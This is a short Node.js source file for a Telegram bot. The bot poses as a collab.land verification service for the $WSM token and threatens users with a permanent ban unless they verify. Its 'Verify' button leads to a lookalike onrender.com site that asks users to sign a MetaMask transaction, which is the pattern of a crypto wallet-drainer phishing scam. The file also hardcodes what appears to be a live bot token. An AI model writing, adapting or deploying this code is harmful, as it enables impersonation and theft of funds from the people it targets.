const TelegramBot = require('node-telegram-bot-api');

// Replace 'YOUR_API_TOKEN' with the token provided by BotFather
const token = '7059604258:AAH3iJ1UKSKuuflNGXnP2ctf0APh_qyJPGc';

// Create a new instance of the Telegram bot
const bot = new TelegramBot(token, { polling: true });

// Listen for incoming messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  // Respond to a specific command, e.g., '/start'
  if (messageText === '/start') {
    const welcomeMessage = `
We partnered with collab.land have set up extra security steps to combat alt accounts, spammers, and raiders. 
If our system can verify your hold $WSM, you will be free to engage in the Official Telegram. 
Should your account fail to verify, you will be permanently banned.`;

    // Create a custom keyboard with a "Let's Go" button
    const letsgoKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Let's Go",
              callback_data: 'letsgo', // Callback data to identify the button click
            },
          ],
        ],
      },
    };

    bot.sendMessage(chatId, welcomeMessage, letsgoKeyboard);
  }
});

// Listen for button clicks
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'letsgo') {
    // Send the feedback message
    const feedbackMessage = `
Use this custom link to connect and verify (valid for 5 minutes)
You should expect to confirm and sign the transaction when prompted by a non-custodial wallet such as MetaMask to Verify you Hold $WSM`;

    // Create a custom keyboard with a "Verify" button leading to a different URL
    const verifyKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Verify',
              url: 'https://wallstreetmemesxcollabland.onrender.com/', // Open the URL when the button is clicked
            },
          ],
        ],
      },
    };

    bot.sendMessage(chatId, feedbackMessage, verifyKeyboard);
  }
});